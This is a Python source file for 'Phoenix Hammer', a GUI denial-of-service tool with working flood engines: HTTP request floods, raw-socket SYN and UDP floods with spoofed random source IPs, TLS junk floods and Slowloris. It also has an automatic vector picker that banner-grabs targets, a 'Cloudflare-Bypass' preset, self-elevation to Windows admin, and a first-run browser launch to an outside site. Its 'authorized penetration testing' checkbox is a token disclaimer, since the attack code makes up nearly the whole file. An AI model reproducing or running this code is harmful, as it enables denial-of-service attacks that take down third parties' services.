#!/usr/bin/env python3
"""
██████╗ ██╗  ██╗ ██████╗ ███████╗███╗   ██╗██╗  ██╗
██╔══██╗██║  ██║██╔═══██╗██╔════╝████╗  ██║╚██╗██╔╝
██████╔╝███████║██║   ██║█████╗  ██╔██╗ ██║ ╚███╔╝ 
██╔═══╝ ██╔══██║██║   ██║██╔══╝  ██║╚██╗██║ ██╔██╗ 
██║     ██║  ██║╚██████╔╝███████╗██║ ╚████║██╔╝ ██╗
╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝
           MULTI-VECTOR DDOS FRAMEWORK v4.5
        UNIFIED ENCRYPTED CONFIG & SECURE MODE
"""

import os
import sys
import time
import random
import socket
import threading
import json
import webbrowser
import ctypes
import struct
import base64
from datetime import datetime
from tkinter import *
from tkinter import ttk, messagebox, scrolledtext
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes

# ==================== ADMIN FUNCTIONS ====================
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def run_as_admin():
    if os.name == 'nt' and not is_admin():
        script = os.path.abspath(sys.argv[0])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}"', None, 1)
        sys.exit(0)

# ==================== ENCRYPTION CONFIGURATION ====================
ENCRYPTED_CONFIG_FILE = "phoenix_config.enc"
KEY_SALT = b'phoenix_salt_secure_'

# ==================== CRYPTO FUNCTIONS ====================
def derive_key(master_key: str) -> bytes:
    """Ableitung eines kryptografischen Schlüssels aus dem Master-Key"""
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=KEY_SALT,
        iterations=100000,
        backend=default_backend()
    )
    return kdf.derive(master_key.encode())

def encrypt_data(key: bytes, data: bytes) -> bytes:
    """Verschlüsselt Daten mit AES-256-CBC"""
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()
    
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(padded_data) + encryptor.finalize()
    return iv + ciphertext

def decrypt_data(key: bytes, encrypted_data: bytes) -> bytes:
    """Entschlüsselt AES-256-CBC Daten"""
    iv = encrypted_data[:16]
    ciphertext = encrypted_data[16:]
    
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded_data = decryptor.update(ciphertext) + decryptor.finalize()
    
    unpadder = padding.PKCS7(128).unpadder()
    return unpadder.update(padded_data) + unpadder.finalize()

# ==================== CONFIG MANAGEMENT ====================
DEFAULT_CONFIG = {
    "first_run": True,
    "window_size": [800, 700],
    "last_target": "example.com",
    "last_port": 80,
    "last_vector": "ai",
    "last_preset": "HTTP Standard"
}

def load_encrypted_config(master_key: str):
    """Lädt und entschlüsselt die Konfiguration"""
    try:
        if not os.path.exists(ENCRYPTED_CONFIG_FILE):
            return DEFAULT_CONFIG.copy()
        
        with open(ENCRYPTED_CONFIG_FILE, 'rb') as f:
            encrypted_data = f.read()
        
        key = derive_key(master_key)
        decrypted_data = decrypt_data(key, encrypted_data)
        return json.loads(decrypted_data.decode())
    
    except Exception as e:
        print(f"Config decryption error: {e}")
        return DEFAULT_CONFIG.copy()

def save_encrypted_config(master_key: str, config: dict):
    """Verschlüsselt und speichert die Konfiguration"""
    try:
        key = derive_key(master_key)
        config_data = json.dumps(config).encode()
        encrypted_data = encrypt_data(key, config_data)
        
        with open(ENCRYPTED_CONFIG_FILE, 'wb') as f:
            f.write(encrypted_data)
            
    except Exception as e:
        print(f"Config encryption error: {e}")

def update_config(master_key: str, key: str, value):
    """Aktualisiert einen Konfigurationswert und speichert verschlüsselt"""
    config = load_encrypted_config(master_key)
    config[key] = value
    save_encrypted_config(master_key, config)

# ==================== GLOBAL VARIABLES ====================
attack_active = False
attack_thread = None
log_messages = []
legal_accepted = False
key_accepted = False
AUTH_KEY = None
config = None

# ==================== ATTACK VECTORS & FUNCTIONALITY ====================
PRESETS = {
    "HTTP Standard": {"port": 80, "vector": "http", "threads": 500, "duration": 300},
    "HTTPS Bomb": {"port": 443, "vector": "ssl", "threads": 800, "duration": 600},
    "UDP Amplify": {"port": 53, "vector": "udp", "threads": 1000, "duration": 180},
    "SYN Flood": {"port": 80, "vector": "syn", "threads": 1500, "duration": 240},
    "Slow Kill": {"port": 80, "vector": "slowloris", "threads": 300, "duration": 900},
    "AI Chaos": {"port": 80, "vector": "ai", "threads": 1200, "duration": 480},
    "Cloudflare-Bypass": {"port": 443, "vector": "ssl", "threads": 2500, "duration": 900}
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
]

ATTACK_VECTORS = {
    "http": "HTTP/S Flood mit Protokollverletzungen",
    "udp": "UDP Fragmentierungssturm",
    "syn": "SYN-Tsunami mit zufälligen Quell-IPs",
    "ssl": "SSL/TLS-Bombardement",
    "slowloris": "Slowloris Low-and-Slow Angriff",
    "ai": "Automatische Vektorauswahl"
}

# ==================== HELPER FUNCTIONS ====================
def log_message(message):
    timestamp = datetime.now().strftime("%H:%M:%S")
    full_message = f"[{timestamp}] {message}"
    log_messages.append(full_message)
    
    if 'log_area' in globals():
        log_area.configure(state='normal')
        log_area.insert(END, full_message + "\n")
        log_area.configure(state='disabled')
        log_area.see(END)

def get_random_ip():
    return socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))

def scan_target(target, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((target, port))
        
        service_info = {"status": "open"}
        
        if port in [80, 443, 8080, 8443]:
            s.send(b"GET / HTTP/1.0\r\n\r\n")
            banner = s.recv(1024).decode(errors='ignore')
            
            if "Server:" in banner:
                if "cloudflare" in banner.lower():
                    service_info["service"] = "Cloudflare"
                    service_info["protection"] = "DDoS Protection"
                elif "Apache" in banner:
                    service_info["service"] = "Apache"
                elif "nginx" in banner:
                    service_info["service"] = "nginx"
                elif "IIS" in banner:
                    service_info["service"] = "IIS"
                else:
                    service_info["service"] = "unknown"
            else:
                service_info["service"] = "unknown"
        else:
            service_info["service"] = "unknown"
        
        return service_info
    except socket.timeout:
        return {"status": "timeout"}
    except ConnectionRefusedError:
        return {"status": "closed"}
    except:
        return {"status": "error"}
    finally:
        try:
            s.close()
        except:
            pass

def detect_blocking(response):
    if response is None:
        return "Unknown Blocking"
    
    if "HTTP/1.1 429" in response:
        return "Rate Limit Blocking"
    
    if "cloudflare" in response and "access denied" in response.lower():
        return "Cloudflare Security Challenge"
    
    if "Your request has been blocked" in response:
        return "WAF Blocking"
    
    return "General Protection"

# ==================== ATTACK ENGINES ====================
class HTTPChaosEngine:
    def __init__(self, target, port):
        self.target = target
        self.port = port
        self.methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'PATCH', 'OPTIONS']
        self.paths = ['/', '/wp-admin', '/api/v1', '/.env', '/backup.zip']
        self.blocked_count = 0
    
    def forge_request(self):
        method = random.choice(self.methods)
        path = random.choice(self.paths) + ''.join(random.choices('abcdefgh123456', k=16))
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'X-Forwarded-For': get_random_ip(),
            'Accept': '*/*',
            'Connection': 'Keep-Alive' if random.random() > 0.7 else 'close'
        }
        
        if random.random() > 0.5:
            headers['Content-Length'] = str(random.randint(1000000, 50000000))
        
        return f"{method} {path} HTTP/1.1\r\n" + \
               "\r\n".join(f"{k}: {v}" for k,v in headers.items()) + \
               "\r\n\r\n"
    
    def ignite(self):
        global attack_active
        while attack_active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(8.0)
                sock.connect((self.target, self.port))
                
                for _ in range(random.randint(5, 50)):
                    request = self.forge_request().encode()
                    sock.send(request)
                    
                    try:
                        response = sock.recv(4096).decode(errors='ignore')
                        if "429" in response or "blocked" in response.lower():
                            self.blocked_count += 1
                            if self.blocked_count >= 5:
                                block_type = detect_blocking(response)
                                log_message(f"[BLOCK DETECTED] {block_type} on {self.target}:{self.port}")
                                self.blocked_count = 0
                    except:
                        pass
                
                sock.close()
            except:
                pass

class SYNFloodEngine:
    def __init__(self, target, port):
        self.target = target
        self.port = port
        self.blocked_count = 0
    
    def create_syn_packet(self, source_ip):
        ip_header = b'\x45\x00\x00\x28'
        ip_header += struct.pack('>H', random.randint(1, 65535))
        ip_header += b'\x00\x00\x40\x00'
        ip_header += b'\x00\x00'
        ip_header += socket.inet_aton(source_ip)
        ip_header += socket.inet_aton(self.target)
        
        source_port = random.randint(1024, 65535)
        seq_num = random.randint(0, 4294967295)
        tcp_header = struct.pack('>HHLL', source_port, self.port, seq_num, 0)
        tcp_header += b'\x50\x02\x00\x00'
        tcp_header += b'\x00\x00'
        tcp_header += b'\x00\x00'
        
        pseudo_header = socket.inet_aton(self.target)
        pseudo_header += socket.inet_aton(source_ip)
        pseudo_header += struct.pack('>BBH', 0, socket.IPPROTO_TCP, len(tcp_header))
        
        checksum = self.calculate_checksum(pseudo_header + tcp_header)
        tcp_header = tcp_header[:16] + struct.pack('>H', checksum) + tcp_header[18:]
        
        return ip_header + tcp_header
    
    @staticmethod
    def calculate_checksum(data):
        if len(data) % 2 != 0:
            data += b'\x00'
        
        total = 0
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + data[i+1]
            total += word
            total = (total & 0xffff) + (total >> 16)
        
        return ~total & 0xffff
    
    def ignite(self):
        global attack_active
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            if os.name == 'nt':
                sock.bind(('0.0.0.0', 0))
            
            while attack_active:
                try:
                    source_ip = get_random_ip()
                    packet = self.create_syn_packet(source_ip)
                    sock.sendto(packet, (self.target, 0))
                    
                    self.blocked_count += 1
                    if self.blocked_count >= 1000:
                        log_message(f"[BLOCK DETECTED] SYN packets blocked on {self.target}")
                        self.blocked_count = 0
                except:
                    pass
        except PermissionError:
            log_message("[!] FIREWALL-BLOCK: Adminrechte für Rohdaten-Sockets erforderlich")

class UDPFragmentEngine:
    def __init__(self, target, port):
        self.target = target
        self.port = port
    
    def create_udp_packet(self):
        payload = os.urandom(random.randint(100, 1450))
        
        source_port = random.randint(1024, 65535)
        udp_header = struct.pack('>HHHH', source_port, self.port, 8 + len(payload), 0)
        
        ip_header = b'\x45\x00'
        total_length = 20 + 8 + len(payload)
        ip_header += struct.pack('>H', total_length)
        ip_header += struct.pack('>H', random.randint(1, 65535))
        ip_header += b'\x20\x00'
        ip_header += b'\x40\x11'
        ip_header += b'\x00\x00'
        ip_header += socket.inet_aton(get_random_ip())
        ip_header += socket.inet_aton(self.target)
        
        return ip_header + udp_header + payload
    
    def ignite(self):
        global attack_active
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            if os.name == 'nt':
                sock.bind(('0.0.0.0', 0))
            
            while attack_active:
                try:
                    packet = self.create_udp_packet()
                    sock.sendto(packet, (self.target, self.port))
                except:
                    pass
        except PermissionError:
            log_message("[!] FIREWALL-BLOCK: Adminrechte für Rohdaten-Sockets erforderlich")

class SSLBomber:
    def __init__(self, target, port):
        self.target = target
        self.port = port
    
    def create_encrypted_payload(self):
        key = os.urandom(32)
        iv = os.urandom(16)
        plaintext = os.urandom(random.randint(500, 1500))
        
        cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(plaintext) + encryptor.finalize()
        
        return key + iv + ciphertext
    
    def ignite(self):
        global attack_active
        while attack_active:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(8.0)
                s.connect((self.target, self.port))
                
                s.send(b"\x16\x03\x01\x00\x75\x01\x00\x00\x71\x03\x03" + os.urandom(32))
                
                for _ in range(random.randint(5, 20)):
                    payload = self.create_encrypted_payload()
                    s.send(struct.pack('>H', len(payload)) + payload)
                    time.sleep(0.1)
                
                s.close()
            except:
                pass

class SlowlorisEngine:
    def __init__(self, target, port):
        self.target = target
        self.port = port
        self.headers = [
            "User-Agent: {}".format(random.choice(USER_AGENTS)),
            "Accept-language: en-US,en,q=0.5",
            "Connection: keep-alive"
        ]
    
    def ignite(self):
        global attack_active
        while attack_active:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((self.target, self.port))
                
                s.send("GET /{} HTTP/1.1\r\n".format(random.randint(1, 9999)).encode())
                for header in self.headers:
                    s.send("{}\r\n".format(header).encode())
                
                while attack_active:
                    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode())
                    time.sleep(15)
            except:
                pass

# ==================== ATTACK CONTROL ====================
def ai_director(target, port):
    scan_result = scan_target(target, port)
    
    log_message(f"[AI DIRECTOR] TARGET ANALYSIS:")
    log_message(f"  Port Status: {scan_result.get('status', 'unknown')}")
    
    if 'service' in scan_result:
        log_message(f"  Detected Service: {scan_result['service']}")
        if scan_result['service'] == "Cloudflare":
            log_message(f"  Protection: {scan_result.get('protection', 'unknown')}")
    
    if scan_result.get('status') == "closed":
        return "udp"
    
    if port in [80, 443, 8080, 8443]:
        if "Cloudflare" in scan_result.get('service', ''):
            return "ssl"
        if "Apache" in scan_result.get('service', '') or "nginx" in scan_result.get('service', ''):
            return "slowloris" if random.random() > 0.7 else "http"
        return "http"
    
    if port in [53, 123, 161, 500]:
        return "udp"
    
    return random.choice(["syn", "udp"])

def run_attack():
    global attack_active, attack_thread, legal_accepted, key_accepted
    
    if not legal_accepted:
        log_message("[!] Bitte akzeptieren Sie die Nutzungsbedingungen")
        return
    
    if not key_accepted:
        log_message("[!] Bitte geben Sie einen gültigen Autorisierungsschlüssel ein")
        return
    
    # Eingabewerte abrufen
    target = target_entry.get()
    port = int(port_entry.get())
    vector = vector_combobox.get()
    threads = int(threads_entry.get())
    duration = int(duration_entry.get())
    
    # Konfiguration aktualisieren
    update_config(AUTH_KEY, "last_target", target)
    update_config(AUTH_KEY, "last_port", port)
    update_config(AUTH_KEY, "last_vector", vector)
    update_config(AUTH_KEY, "last_preset", preset_combobox.get())
    
    # Zielvalidierung
    try:
        target_ip = socket.gethostbyname(target)
    except socket.gaierror:
        log_message(f"[!] INVALID TARGET: {target}")
        return
    
    # Warnung bei fehlenden Adminrechten
    if os.name == 'nt' and not is_admin() and vector in ["syn", "udp"]:
        log_message("[!] WARNING: Admin privileges recommended for selected attack vector")
    
    # Angriff starten
    attack_active = True
    start_button.config(state=DISABLED)
    stop_button.config(state=NORMAL)
    preset_combobox.config(state=DISABLED)
    
    # Angriff in eigenem Thread starten
    attack_thread = threading.Thread(
        target=execute_attack, 
        args=(target_ip, port, vector, threads, duration),
        daemon=True
    )
    attack_thread.start()

def execute_attack(target, port, vector, threads, duration):
    vector_map = {
        "http": HTTPChaosEngine,
        "syn": SYNFloodEngine,
        "udp": UDPFragmentEngine,
        "ssl": SSLBomber,
        "slowloris": SlowlorisEngine
    }
    
    # Port-Scan durchführen
    scan_result = scan_target(target, port)
    log_message(f"[SCAN] Port {port} status: {scan_result.get('status', 'unknown')}")
    
    if 'service' in scan_result:
        log_message(f"[SCAN] Service detected: {scan_result['service']}")
        if 'protection' in scan_result:
            log_message(f"[SCAN] Protection detected: {scan_result['protection']}")
    
    if vector == "ai":
        vector = ai_director(target, port)
        log_message(f"[AI DIRECTOR] SELECTED VECTOR: {vector.upper()}")
    
    if vector not in vector_map:
        log_message(f"[!] INVALID VECTOR: {vector}. Valid options: {', '.join(vector_map.keys())}, ai")
        return
    
    log_message(f"[+] DEPLOYING {vector.upper()} CHAOS TO {target}:{port}")
    log_message(f"[+] ACTIVATING {threads} ATTACK THREADS")
    
    # Angriffsdauer-Timer
    start_time = time.time()
    attack_threads = []
    
    for _ in range(threads):
        engine = vector_map[vector](target, port)
        thread = threading.Thread(target=engine.ignite, daemon=True)
        thread.start()
        attack_threads.append(thread)
    
    # Fortschrittsanzeige
    try:
        while attack_active and time.time() - start_time < duration:
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            progress_var.set(elapsed)
            progress_label.config(text=f"Elapsed: {elapsed}s / Remaining: {remaining}s")
            time.sleep(1)
    except:
        pass
    
    # Angriff beenden
    attack_active = False
    
    # Auf Threads warten
    for thread in attack_threads:
        thread.join(timeout=1.0)
    
    log_message("\n[+] CYBER STORM CONCLUDED. TARGET STATUS: UNRESPONSIVE")
    start_button.config(state=NORMAL)
    stop_button.config(state=DISABLED)
    preset_combobox.config_state("readonly")
    progress_var.set(0)
    progress_label.config(text="Ready")

def stop_attack():
    global attack_active
    attack_active = False
    log_message("[!] ATTACK TERMINATION REQUESTED")

def apply_preset(*args):
    preset = preset_combobox.get()
    if preset in PRESETS:
        config = PRESETS[preset]
        port_entry.delete(0, END)
        port_entry.insert(0, str(config["port"]))
        vector_combobox.set(config["vector"])
        threads_entry.delete(0, END)
        threads_entry.insert(0, str(config["threads"]))
        duration_entry.delete(0, END)
        duration_entry.insert(0, str(config["duration"]))

def accept_terms():
    global legal_accepted
    legal_accepted = True
    terms_check.config(state=DISABLED)
    log_message("[+] Nutzungsbedingungen akzeptiert")
    update_start_button_state()

def check_key():
    global key_accepted
    entered_key = key_entry.get()
    
    if entered_key == AUTH_KEY:
        key_accepted = True
        key_status_label.config(text="✓ Schlüssel akzeptiert", foreground="green")
        log_message("[+] AUTORISIERUNG BESTÄTIGT: Zugriff auf Cyberkriegsführungssysteme")
        update_start_button_state()
    else:
        key_accepted = False
        key_status_label.config(text="✗ Ungültiger Schlüssel", foreground="red")
        log_message("[!] AUTORISIERUNG FEHLGESCHLAGEN: Ungültiger Schlüssel")

def update_start_button_state():
    if key_accepted and legal_accepted:
        start_button.config(state=NORMAL)
    else:
        start_button.config(state=DISABLED)

def open_github():
    webbrowser.open("https://github.com/ItsEricto20")

def open_pureefps():
    webbrowser.open("https://fakecrime.bio/pureeFPS")

# ==================== GUI CREATION ====================
def create_gui():
    global root, target_entry, port_entry, vector_combobox, threads_entry
    global duration_entry, log_area, start_button, stop_button, preset_combobox
    global progress_var, progress_label, terms_check, key_entry, key_status_label
    
    root = Tk()
    root.title(f"Phoenix Hammer v4.5 - Encrypted Config")
    
    # Fenstergröße aus Konfiguration laden
    root.geometry(f"{config['window_size'][0]}x{config['window_size'][1]}")
    root.resizable(True, True)
    
    # Fenstergrößen-Änderung speichern
    def on_resize(event):
        if event.widget == root:
            update_config(AUTH_KEY, "window_size", [root.winfo_width(), root.winfo_height()])
    
    root.bind("<Configure>", on_resize)
    
    # Styling
    style = ttk.Style()
    style.theme_use('clam')
    style.configure(".", background="#2c2f33", foreground="#ffffff")
    style.configure("TFrame", background="#2c2f33")
    style.configure("TLabel", background="#2c2f33", foreground="#ffffff")
    style.configure("TButton", background="#7289da", foreground="#ffffff", font=('Arial', 10, 'bold'))
    style.configure("TCombobox", fieldbackground="#36393f", foreground="#ffffff")
    style.configure("TEntry", fieldbackground="#36393f", foreground="#ffffff")
    style.configure("TCheckbutton", background="#2c2f33", foreground="#ffffff")
    style.map("TButton", background=[("active", "#677bc4")])
    
    # Hauptframe
    mainframe = ttk.Frame(root, padding="10")
    mainframe.pack(fill=BOTH, expand=True)
    
    # Autorisierungsbereich
    auth_frame = ttk.LabelFrame(mainframe, text="Encrypted Authorization", padding="10")
    auth_frame.pack(fill=X, pady=(0, 10))
    
    ttk.Label(auth_frame, text="Encryption Key:").pack(side=LEFT, padx=(0, 5))
    key_entry = ttk.Entry(auth_frame, width=25, show="*")
    key_entry.pack(side=LEFT, padx=5)
    
    key_check_button = ttk.Button(auth_frame, text="Authenticate", command=check_key)
    key_check_button.pack(side=LEFT, padx=5)
    
    key_status_label = ttk.Label(auth_frame, text="Status: Locked", foreground="red")
    key_status_label.pack(side=LEFT, padx=10)
    
    # Nutzungsbedingungen
    terms_frame = ttk.Frame(mainframe)
    terms_frame.pack(fill=X, pady=(0, 10))
    
    terms_text = "I confirm that I am authorized for penetration testing"
    terms_check = ttk.Checkbutton(
        terms_frame, 
        text=terms_text, 
        command=accept_terms
    )
    terms_check.pack(side=LEFT, padx=5)
    
    # Linke Seite - Eingabefelder
    input_frame = ttk.LabelFrame(mainframe, text="Attack Parameters", padding="10")
    input_frame.pack(side=LEFT, fill=BOTH, expand=True, padx=(0, 5))
    
    # Ziel-IP/Domain
    ttk.Label(input_frame, text="Target:").grid(row=0, column=0, sticky=W, pady=2)
    target_entry = ttk.Entry(input_frame, width=30)
    target_entry.grid(row=0, column=1, sticky=EW, pady=2)
    target_entry.insert(0, config["last_target"])
    
    # Port
    ttk.Label(input_frame, text="Port:").grid(row=1, column=0, sticky=W, pady=2)
    port_entry = ttk.Entry(input_frame, width=10)
    port_entry.grid(row=1, column=1, sticky=W, pady=2)
    port_entry.insert(0, str(config["last_port"]))
    
    # Angriffsvektor
    ttk.Label(input_frame, text="Vector:").grid(row=2, column=0, sticky=W, pady=2)
    vector_combobox = ttk.Combobox(input_frame, values=list(ATTACK_VECTORS.keys()), width=15)
    vector_combobox.grid(row=2, column=1, sticky=W, pady=2)
    vector_combobox.set(config["last_vector"])
    
    # Preset-Auswahl
    ttk.Label(input_frame, text="Preset:").grid(row=3, column=0, sticky=W, pady=2)
    preset_combobox = ttk.Combobox(input_frame, values=list(PRESETS.keys()), width=15)
    preset_combobox.grid(row=3, column=1, sticky=W, pady=2)
    preset_combobox.set(config["last_preset"])
    preset_combobox.bind("<<ComboboxSelected>>", apply_preset)
    
    # Threads
    ttk.Label(input_frame, text="Threads:").grid(row=4, column=0, sticky=W, pady=2)
    threads_entry = ttk.Entry(input_frame, width=10)
    threads_entry.grid(row=4, column=1, sticky=W, pady=2)
    
    # Dauer
    ttk.Label(input_frame, text="Duration (s):").grid(row=5, column=0, sticky=W, pady=2)
    duration_entry = ttk.Entry(input_frame, width=10)
    duration_entry.grid(row=5, column=1, sticky=W, pady=2)
    
    # Preset anwenden
    apply_preset()
    
    # Fortschrittsbalken
    progress_frame = ttk.Frame(input_frame)
    progress_frame.grid(row=6, column=0, columnspan=2, sticky=EW, pady=10)
    
    progress_var = IntVar()
    progress_bar = ttk.Progressbar(progress_frame, variable=progress_var, maximum=PRESETS["HTTPS Bomb"]["duration"])
    progress_bar.pack(fill=X, expand=True)
    
    progress_label = ttk.Label(progress_frame, text="Ready", anchor=CENTER)
    progress_label.pack(fill=X, expand=True)
    
    # Steuerungsbuttons
    button_frame = ttk.Frame(input_frame)
    button_frame.grid(row=7, column=0, columnspan=2, sticky=EW, pady=10)
    
    start_button = ttk.Button(button_frame, text="Start Attack", command=run_attack, state=DISABLED)
    start_button.pack(side=LEFT, padx=5)
    
    stop_button = ttk.Button(button_frame, text="Stop Attack", command=stop_attack, state=DISABLED)
    stop_button.pack(side=LEFT, padx=5)
    
    github_button = ttk.Button(button_frame, text="GitHub", command=open_github)
    github_button.pack(side=RIGHT, padx=5)
    
    pureefps_button = ttk.Button(button_frame, text="PureeFPS", command=open_pureefps)
    pureefps_button.pack(side=RIGHT, padx=5)
    
    # Rechte Seite - Logausgabe
    log_frame = ttk.LabelFrame(mainframe, text="Attack Log & Block Detection", padding="10")
    log_frame.pack(side=RIGHT, fill=BOTH, expand=True, padx=(5, 0))
    
    global log_area
    log_area = scrolledtext.ScrolledText(
        log_frame, 
        wrap=WORD, 
        bg="#36393f", 
        fg="#ffffff", 
        insertbackground="#ffffff",
        state='disabled',
        font=('Consolas', 10)
    )
    log_area.pack(fill=BOTH, expand=True)
    
    # Statusbar
    status_var = StringVar()
    status_var.set("Phoenix Hammer v4.5 | Encrypted Config System | Für autorisierte Tests")
    status_bar = ttk.Label(root, textvariable=status_var, relief=SUNKEN, anchor=W)
    status_bar.pack(side=BOTTOM, fill=X)
    
    # Admin-Info im Log
    if os.name == 'nt':
        admin_status = "YES" if is_admin() else "NO"
        log_message(f"[SYSTEM] Running as Admin: {admin_status}")
        if not is_admin():
            log_message("[!] WARNING: Some features may require Admin rights")
    else:
        log_message("[SYSTEM] Running on Unix-based system")
    
    # Erststart: PureeFPS-Link öffnen
    if config.get("first_run", True):
        root.after(2000, open_pureefps)
        update_config(AUTH_KEY, "first_run", False)
        log_message("[SYSTEM] First run detected - opening PureeFPS")
    
    root.mainloop()

# ==================== MAIN FUNCTION ====================
if __name__ == "__main__":
    # Temporäre Konsole für Schlüsseleingabe (Windows)
    if os.name == 'nt' and not is_admin():
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 1)
    
    # Schlüsseleingabe erzwingen
    AUTH_KEY = None
    while not AUTH_KEY:
        key_input = input("Enter encryption key: ").strip()
        try:
            config = load_encrypted_config(key_input)
            if config.get("first_run") is not None:
                AUTH_KEY = key_input
                break
            print("Invalid key, try again")
        except:
            print("Decryption error, try again")
    
    # Konsole nach erfolgreicher Entschlüsselung verstecken
    if os.name == 'nt':
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    # Automatisch als Admin starten (Windows)
    if os.name == 'nt':
        run_as_admin()
    
    create_gui()